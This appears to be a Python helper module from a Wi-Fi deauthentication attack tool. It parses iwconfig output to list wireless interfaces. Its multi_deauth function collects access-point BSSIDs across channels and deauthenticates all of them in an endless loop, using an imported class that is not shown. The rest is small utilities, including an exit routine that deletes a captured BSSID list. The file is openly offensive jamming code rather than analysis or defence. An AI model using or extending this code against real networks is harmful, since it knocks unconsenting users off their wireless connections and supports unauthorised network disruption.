import subprocess,os
from classes import *
from time import sleep
realexit=exit
def inlineraise(message):
    raise Exception(message)
def will_fit(len):
    width,height=os.get_terminal_size()
    if len<width:
        return True
    else:
        return False
def multi_deauth(interface:wlan_interface,common_channels:dict):
    interface.Stop_interface()
    BSSIDs=[]
    for channel in common_channels.keys():
        for MAC in common_channels[channel]:
            BSSIDs.append(bssid(MAC,channel))
    while True:
        for BSSID in BSSIDs:
            BSSID.Deauth(interface)
def countdown_sleep(time:int,reason:str=None):
    for i in range(time):
        print(f"{reason if reason else 'continue'} in {time-i}")
        sleep(1)
def exit():
    os.remove("BSSIDs-01.csv")
    realexit()
def get_interfaces():
    wifi_interfaces = subprocess.check_output("iwconfig").decode().split("\n")
    for line in wifi_interfaces[:]:
        if not line.startswith("wlan"):
            wifi_interfaces.remove(line)
    for i,interface in enumerate(wifi_interfaces[:]):
        rest = interface.split("  ")
        name = rest[0]
        mode = rest[3] if rest[3].startswith("Mode") else "Mode:Managed"
        wifi_interfaces[i] = [name,mode]
    return wifi_interfaces